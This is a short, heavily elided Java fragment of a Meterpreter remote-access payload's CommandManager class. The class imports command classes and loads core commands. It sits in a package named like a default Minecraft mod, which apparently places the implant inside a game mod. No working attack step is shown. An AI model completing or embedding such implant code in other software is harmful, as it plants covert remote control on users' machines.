package com.example.examplemod.meterpreter;
...
import com.example.examplemod.meterpreter.command.NotYetImplementedCommand;
import com.example.examplemod.meterpreter.command.UnsupportedJavaVersionCommand;
...
public class CommandManager {
    ...
    protected CommandManager() throws Exception {
        ...
        // load core commands
        new com.example.examplemod.meterpreter.core.Loader().load(this);
    }
